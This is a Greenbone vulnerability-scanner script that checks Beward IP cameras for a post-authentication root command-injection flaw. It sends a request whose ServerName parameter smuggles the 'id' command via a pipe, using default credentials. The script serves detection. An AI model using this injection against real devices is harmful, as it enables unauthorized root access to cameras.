if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.114072" );
	script_version( "2021-02-25T16:05:56+0000" );
	script_tag( name: "cvss_base", value: "8.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:C/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-02-25 16:05:56 +0000 (Thu, 25 Feb 2021)" );
	script_tag( name: "creation_date", value: "2019-02-13 15:39:42 +0100 (Wed, 13 Feb 2019)" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2019 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_name( "Beward IP Camera Root Remote Code Execution Vulnerability" );
	script_dependencies( "gb_beward_ip_camera_consolidation.sc", "gb_beward_ip_cameras_default_credentials.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "beward/ip_camera/detected", "beward/ip_camera/credentials" );
	script_xref( name: "URL", value: "https://www.zeroscience.mk/en/vulnerabilities/ZSL-2019-5512.php" );
	script_tag( name: "summary", value: "The remote installation of Beward's IP camera software is prone to
  a post-authentication root remote code execution vulnerability." );
	script_tag( name: "impact", value: "This issue may be exploited by a remote attacker to
  inject arbitrary system commands and gain root remote code execution." );
	script_tag( name: "insight", value: "The issue exists, because the software allows for injecting commands into
  specific requests." );
	script_tag( name: "vuldetect", value: "Checks if the host responds with simple requested IDs." );
	script_tag( name: "affected", value: "At least versions M2.1.6.04C014 and before." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_vul" );
	exit( 0 );
}
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
CPE = "cpe:/h:beward";
if(!info = get_app_port_from_cpe_prefix( cpe: CPE, service: "www" )){
	exit( 0 );
}
CPE = info["cpe"];
port = info["port"];
if(!get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
creds = get_kb_list( "beward/ip_camera/credentials" );
if(!creds){
	exit( 0 );
}
for cred in creds {
	url = "/cgi-bin/operator/servetest?cmd=ntp&ServerName=pool.ntp.org|id||&TimeZone=03:00";
	req = http_get_req( port: port, url: url, add_headers: make_array( "Accept-Encoding", "gzip, deflate", "Authorization", "Basic " + base64( str: cred ) ) );
	res = http_keepalive_send_recv( port: port, data: req );
	if(ContainsString( res, "uid=" ) && ContainsString( res, "gid=" ) && ContainsString( res, "groups=" )){
		report = http_report_vuln_url( port: port, url: url );
		report += "\nUsed default credentials for the login and the sent request: (username:password)\n" + cred;
		security_message( port: port, data: report );
		exit( 0 );
	}
}
exit( 99 );

